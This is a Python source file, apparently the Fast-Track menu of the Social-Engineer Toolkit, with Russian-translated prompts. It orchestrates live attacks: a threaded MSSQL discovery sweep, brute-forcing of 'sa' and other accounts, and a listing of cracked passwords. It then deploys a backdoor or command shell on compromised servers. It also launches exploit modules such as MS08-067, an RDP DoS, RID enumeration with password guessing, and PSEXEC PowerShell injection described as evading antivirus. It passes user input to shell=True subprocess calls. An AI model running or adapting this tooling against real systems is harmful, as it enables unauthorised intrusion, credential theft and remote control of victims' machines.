#!/usr/bin/env python
from src.core.setcore import *
from src.core.menu import text
import subprocess
from multiprocessing.dummy import Pool as ThreadPool
definepath = os.getcwd()

try: input = raw_input
except: pass

#
#
# Fast-Track Main options and interface menus
#
#
try:
    while 1:
        #
        # USER INPUT: SHOW WEB ATTACK MENU         #
        #

        create_menu(text.fasttrack_text, text.fasttrack_menu)
        attack_vector = raw_input(setprompt(["19"], ""))

        if attack_vector == "99" or attack_vector == "quit" or attack_vector == "exit":
            break

        #
        #
        # mssql_scanner
        #
        #
        if attack_vector == "1":
            # start the menu
            create_menu(text.fasttrack_mssql_text1, text.fasttrack_mssql_menu1)
            # take input here
            attack_vector_sql = raw_input(setprompt(["19", "21"], ""))

            #
            # option 1 scan and attack, option 2 connect directly to mssql
            # if 1, start scan and attack
            #
            if attack_vector_sql == '1':
                print(
                    "\nЗдесь вы можете выбрать либо нотацию CIDR / IP-адрес, либо имя файла\nкоторый содержит список IP-адресов.\n\nФормат файла будет похож на этот:\n\n192.168.13.25\n192.168.13.26\n192.168.13.26\n\n1. Сканирование IP-адреса или CIDR\n2. Файл импорта, содержащий IP-адреса SQL Server\n")
                choice = raw_input(
                    setprompt(["19", "21", "22"], "Введите ваш выбор (ex. 1 or 2) [1]"))
                if choice != "1":
                    if choice != "2":
                        if choice != "":
                            print_error(
                                "Вы не указали 1 или 2! Пожалуйста, попробуйте еще раз.")
                            choice = raw_input(
                                setprompt(["19", "21", "22"], "Введите ваш выбор  (ex. 1 or 2) [1]"))
                # grab ip address
                if choice == "":
                    choice = "1"
                if choice == "1":
                    range = raw_input(setprompt(
                        ["19", "21", "22"], "Введите CIDR, один IP-адрес или несколько IP-адресов, разделенных пробелом (ex. 192.168.1.1/24)"))
                if choice == "2":
                    while 1:
                        range = raw_input(setprompt(
                            ["19", "21", "22"], "Введите имя файла для серверов SQL (например, /root/sql.txt - примечание может быть в формате ipaddr:port)"))
                        if not os.path.isfile(range):
                            print_error(
                                "Файл не найден! Пожалуйста, введите путь к файлу правильно.")
                        else:
                            break
                if choice == "1":
                    port = "1433"
                if choice == "2":
                    port = "1433"
                # ask for a wordlist
                wordlist = raw_input(setprompt(
                    ["19", "21", "22"], "Введите путь к файлу списка слов [использовать список слов по умолчанию]"))
                if wordlist == "":
                    wordlist = "default"
                # specify the user to brute force
                username = raw_input(setprompt(
                    ["19", "21", "22"], "Введите имя пользователя для грубой силы или укажите файл имени пользователя (/root/users.txt) [sa]"))
                # default to sa
                if username == "":
                    username = "sa"
                if username != "sa":
                    if not os.path.isfile(username):
                        print_status(
                            "Если вы использовали файл, он не найден, используя текст в качестве имени пользователя.")
                # import the mssql module from fasttrack
                from src.fasttrack import mssql
                # choice from earlier if we want to use a filelist or whatnot
                if choice != "2":
                    # sql_servers
                    sql_servers = ''
                    print_status("Охота за серверами SQL. Это может занять немного.")
                    if "/" or " " in str(range):
                        if "/" in str(range):
                            iprange = printCIDR(range)
                            iprange = iprange.split(",")
                            pool = ThreadPool(200)
                            sqlport = pool.map(get_sql_port, iprange)
                            pool.close()
                            pool.join()
                            for sql in sqlport:
                                if sql != None:
                                    if sql != "":
                                        sql_servers = sql_servers + sql + ","

                        else:
                            range1 = range.split(" ")
                            for ip in range1:
                                sqlport = get_sql_port(ip)
                                if sqlport != None:
                                    if sqlport != "":
                                        sql_servers = sql_servers + sqlport + ","

                    else:
                        # use udp discovery to get the SQL server UDP 1434
                        sqlport = get_sql_port(range)
                        # if its not closed then check nmap - if both fail then
                        # nada
                        if sqlport != None:
                            if sqlport != "":
                                sql_servers = sqlport + ","

                # specify choice 2
                if choice == "2":
                    if not os.path.isfile(range):
                        while 1:
                            print_warning(
                                "Извините, босс. Файл не найден. Попробуй снова")
                            range = raw_input(setprompt(
                                ["19", "21", "22"], "Введите CIDR, один, IP или файл с IP-адресами (ex. 192.168.1.1/24)"))
                            if os.path.isfile(range):
                                print_status(
                                    "Атта мальчик. Нашел файл на этот раз. Двигаться дальше.")
                                break

                    fileopen = open(range, "r").readlines()
                    sql_servers = ""
                    for line in fileopen:
                        line = line.rstrip()
                        sql_servers = sql_servers + line + ","

                # this will hold all of the SQL servers eventually
                master_list = ""
                # set a base counter
                counter = 0
                # if we specified a username list
                if os.path.isfile(username):
                    usernames = open(username, "r")

                if sql_servers != False:
                    # get rid of extra data from port scanner
                    sql_servers = sql_servers.replace(":%s OPEN" % (port), "")
                    # split into tuple for different IP address
                    sql_servers = sql_servers.split(",")
                    # start loop and brute force

                    print_status("Следующие SQL-серверы и связанные порты были определены:\n")
                    for sql in sql_servers:
                        if sql != "":
                            print(sql)

                    if len(sql_servers) > 2:
                        print_status("Нажав Enter, вы начнете процесс перебора всех учетных записей SQL, указанных в приведенном выше списке..")
                        test = input("Нажмите {enter}, чтобы начать процесс грубой силы.")
                    for servers in sql_servers:

                        # this will return the following format ipaddr + "," +
                        # username + "," + str(port) + "," + passwords
                        if servers != "":
                            # if we aren't using a username file
                            if not os.path.isfile(username):
                                sql_success = mssql.brute(
                                    servers, username, port, wordlist)
                                if sql_success != False:
                                # after each success or fail it will break
                                # into this to the above with a newline to
                                # be parsed later
                                    master_list = master_list + \
                                        sql_success + ":"
                                    counter = 1

                            # if we specified a username list
                            if os.path.isfile(username):
                                for users in usernames:
                                    users = users.rstrip()
                                    sql_success = mssql.brute(
                                        servers, users, port, wordlist)
                                    # we wont break out of the loop here incase
                                    # theres multiple usernames we want to find
                                    if sql_success != False:
                                        master_list = master_list + \
                                            sql_success + ":"
                                        counter = 1

                # if we didn't successful attack one
                if counter == 0:
                    if sql_servers:
                        print_warning(
                            "Сожалею. Невозможно найти или полностью скомпрометировать сервер MSSQL на следующих серверах SQL: ")

                    else:
                        print_warning(
                            "Сожалею. Невозможно найти серверы SQL для атаки.")
                    pause = raw_input(
                        "Нажмите {return}, чтобы перейти в главное меню.")
                # if we successfully attacked one
                if counter == 1:
                    # need to loop to keep menu going
                    while 1:
                        # set a counter to show compromised servers
                        counter = 1
                        # here we list the servers we compromised
                        master_names = master_list.split(":")
                        print_status(
                            "SET Fast-Track атаковал следующие SQL-серверы: ")
                        for line in sql_servers:
                            if line != "":
                                print("SQL Servers: " + line.rstrip())
                        print_status(
                            "Ниже приведены успешно скомпрометированные системы.\nВыберите компромиссный SQL-сервер, с которым вы хотите взаимодействовать:\n")
                        for success in master_names:
                            if success != "":
                                success = success.rstrip()
                                success = success.split(",")
                                success = bcolors.BOLD + success[0] + bcolors.ENDC + "   username: " + bcolors.BOLD + "%s" % (success[1]) + bcolors.ENDC + " | password: " + bcolors.BOLD + "%s" % (success[
                                    3]) + bcolors.ENDC + "   SQLPort: " + bcolors.BOLD + "%s" % (success[2]) + bcolors.ENDC
                                print("   " + str(counter) + ". " + success)
                                # increment counter
                                counter = counter + 1

                        print("\n   99. Вернуться в главное меню.\n")
                        # select the server to interact with
                        select_server = raw_input(
                            setprompt(["19", "21", "22"], "Выберите сервер SQL для взаимодействия с [1]"))
                        # default 1
                        if select_server == "quit" or select_server == "exit":
                            break
                        if select_server == "":
                            select_server = "1"
                        if select_server == "99":
                            break
                        counter = 1
                        for success in master_names:
                            if success != "":
                                success = success.rstrip()
                                success = success.split(",")
                                # if we equal the number used above
                                if counter == int(select_server):
                                # ipaddr + "," + username + "," + str(port) +
                                # "," + passwords
                                    print(
                                        "\nКак вы хотите развернуть двоичный файл с помощью отладки (win2k, winxp, win2003) и / или powershell (vista, win7,2008,2012) или просто оболочка\n\n   1. Развернуть бэкдор в систему\n   2. Стандартная оболочка Windows\n\n   99. Вернитесь обратно в главное меню.\n")
                                    option = raw_input(
                                        setprompt(["19", "21", "22"], "Какой вариант развертывания вы хотите[1]"))
                                    if option == "":
                                        option = "1"
                                    # if 99 then break
                                    if option == "99":
                                        break
                                    # specify we are using the fasttrack
                                    # option, this disables some features
                                    filewrite = open(
                                        userconfigpath + "fasttrack.options", "w")
                                    filewrite.write("none")
                                    filewrite.close()
                                    # import fasttrack
                                    if option == "1":
                                        # import payloads for selection and
                                        # prep
                                        mssql.deploy_hex2binary(
                                            success[0], success[2], success[1], success[3])
                                    # straight up connect
                                    if option == "2":
                                        mssql.cmdshell(success[0], success[2], success[
                                                       1], success[3], option)
                                # increment counter
                                counter = counter + 1

            #
            # if we want to connect directly to a SQL server
            #
            if attack_vector_sql == "2":
                sql_server = raw_input(setprompt(
                    ["19", "21", "23"], "Введите имя хоста или IP-адрес сервера SQL"))
                sql_port = raw_input(
                    setprompt(["19", "21", "23"], "Введите порт SQL для подключения[1433]"))
                if sql_port == "":
                    sql_port = "1433"
                sql_username = raw_input(
                    setprompt(["19", "21", "23"], "Введите имя пользователя SQL Server [sa]"))
                # default to sa
                if sql_username == "":
                    sql_username = "sa"
                sql_password = raw_input(
                    setprompt(["19", "21", "23"], "Введите пароль для сервера SQL"))
                print_status("Подключение к серверу SQL..")
                # try connecting
                # establish base counter for connection
                counter = 0
                try:
                    import _mssql
                    conn = _mssql.connect(
                        sql_server + ":" + str(sql_port), sql_username, sql_password)
                    counter = 1
                except Exception as e:
                    print(e)
                    print_error("Не удалось подключиться к SQL Server. Попробуй снова.")
                # if we had a successful connection
                if counter == 1:
                    print_status(
                        "Сбрасывание в оболочку SQL. Введите quit для выхода.")
                    # loop forever
                    while 1:
                        # enter the sql command
                        sql_shell = raw_input("Введите здесь команду SQL: ")
                        if sql_shell == "quit" or sql_shell == "exit":
                            print_status(
                                "Выход из оболочки SQL и возврат в меню.")
                            break

                        try:
                            # execute the query
                            sql_query = conn.execute_query(sql_shell)
                            # return results
                            print("\n")
                            for data in conn:
                                data = str(data)
                                data = data.replace("\\n\\t", "\n")
                                data = data.replace("\\n", "\n")
                                data = data.replace("{0: '", "")
                                data = data.replace("'}", "")
                                print(data)
                        except Exception as e:
                            print_warning(
                                "\nНеверный синтаксис где-то. Распечатка сообщения об ошибке: " + str(e))

        #
        #
        # exploits menu
        #
        #
        if attack_vector == "2":
            # start the menu
            create_menu(text.fasttrack_exploits_text1,
                        text.fasttrack_exploits_menu1)
            # enter the exploits menu here
            range = raw_input(
                setprompt(["19", "24"], "Выберите номер эксплойта, который вы хотите"))

            # ms08067
            if range == "1":
                try:
                    module_reload(src.fasttrack.exploits.ms08067)
                except:
                    import src.fasttrack.exploits.ms08067

            # firefox 3.6.16
            if range == "2":
                try:
                    module_reload(src.fasttrack.exploits.firefox_3_6_16)
                except:
                    import src.fasttrack.exploits.firefox_3_6_16
            # solarwinds
            if range == "3":
                try:
                    module_reload(src.fasttrack.exploits.solarwinds)
                except:
                    import src.fasttrack.exploits.solarwinds

            # rdp DoS
            if range == "4":
                try:
                    module_reload(src.fasttrack.exploits.rdpdos)
                except:
                    import src.fasttrack.exploits.rdpdos

            if range == "5":
                try:
                    module_reload(src.fasttrack.exploits.mysql_bypass)
                except:
                    import src.fasttrack.exploits.mysql_bypass

            if range == "6":
                try:
                    module_reload(src.fasttrack.exploits.f5)
                except:
                    import src.fasttrack.exploits.f5

        #
        #
        # sccm attack menu
        #
        #
        if attack_vector == "3":
            # load sccm attack
            try:
                module_reload(src.fasttrack.sccm.sccm_main)
            except:
                import src.fasttrack.sccm.sccm_main

        #
        #
        # dell drac default credential checker
        #
        #
        if attack_vector == "4":
            # load drac menu
            subprocess.Popen("python %s/src/fasttrack/delldrac.py" %
                             (definepath), shell=True).wait()

        #
        #
        # RID ENUM USER ENUMERATION
        #
        #
        if attack_vector == "5":
            print (""".______       __   _______         _______ .__   __.  __    __  .___  ___.
|   _  \     |  | |       \       |   ____||  \ |  | |  |  |  | |   \/   |
|  |_)  |    |  | |  .--.  |      |  |__   |   \|  | |  |  |  | |  \  /  |
|      /     |  | |  |  |  |      |   __|  |  . `  | |  |  |  | |  |\/|  |
|  |\  \----.|  | |  '--'  |      |  |____ |  |\   | |  `--'  | |  |  |  |
| _| `._____||__| |_______/  _____|_______||__| \__|  \______/  |__|  |__|
                |______|
""")
            print(
                "\nRID_ENUM - это инструмент, который будет перечислять учетные записи пользователей с помощью циклической атаки через нулевые сеансы. В\nЧтобы это работало, на удаленном сервере должны быть включены нулевые сеансы. В большинстве случаев вы бы использовали\nэто против контроллера домена на внутреннем тесте на проникновение. Вам не нужно предоставлять учетные данные, это будет\nпопытаться перечислить базовый адрес RID, а затем переключиться через 500 (администратор) на любой RID вы хотите.")
            print("\n")
            ipaddr = raw_input(
                setprompt(["31"], "Введите IP-адрес сервера (или выйдите, чтобы выйти)"))
            if ipaddr == "99" or ipaddr == "quit" or ipaddr == "exit":
                break
            print_status(
                "Далее вы можете автоматически переборить учетные записи пользователей. Если вы не хотите использовать грубую силу, введите no в следующем приглашении")
            dict = raw_input(setprompt(
                ["31"], "Введите путь к файлу словаря для грубой силы [введите для встроенного]"))
            # if we are using the built in one
            if dict == "":
                # write out a file
                filewrite = open(userconfigpath + "dictionary.txt", "w")
                filewrite.write("\nPassword1\nPassword!\nlc username")
                # specify the path
                dict = userconfigpath + "dictionary.txt"
                filewrite.close()

            # if we are not brute forcing
            if dict.lower() == "no":
                print_status("Нет проблем, не перебор учетных записей пользователей")
                dict = ""

            if dict != "":
                print_warning(
                    "Вы собираетесь перебирать учетные записи пользователей, будьте осторожны с блокировками.")
                choice = raw_input(
                    setprompt(["31"], "Вы уверены, что хотите грубую силу?[yes/no]"))
                if choice.lower() == "n" or choice.lower() == "no":
                    print_status(
                        "Ладно. Не перебор учетных записей пользователей*phew*.")
                    dict = ""

            # next we see what rid we want to start
            start_rid = raw_input(
                setprompt(["31"], "С какого RID вы хотите начать [500]"))
            if start_rid == "":
                start_rid = "500"
            # stop rid
            stop_rid = raw_input(
                setprompt(["31"], "На чем RID вы хотите остановиться? [15000]"))
            if stop_rid == "":
                stop_rid = "15000"
            print_status(
                "Запуск RID_ENUM, чтобы начать перечисление учетных записей пользователей...")
            subprocess.Popen("python src/fasttrack/ridenum.py %s %s %s %s" %
                             (ipaddr, start_rid, stop_rid, dict), shell=True).wait()

            # once we are finished, prompt.
            print_status("Все закончено!")
            pause = raw_input("Нажмите {return}, чтобы вернуться в главное меню..")

        #
        #
        # PSEXEC PowerShell
        #
        #
        if attack_vector == "6":
            print(
                "\nPSEXEC PowerShell Инъекционная атака:\n\nЭта атака внедрит бэкдор счетчика меток через инъекцию PowerShell. Это обойдет\nАнтивирус, так как мы никогда не будем трогать диск. Потребуется установить Powershell на удаленной жертве\nмашина. Вы можете использовать либо прямые пароли, либо хэш-значения.\n")
            try:
                module_reload(src.fasttrack.psexec)
            except:
                import src.fasttrack.psexec

# handle keyboard exceptions
except KeyboardInterrupt:
    pass
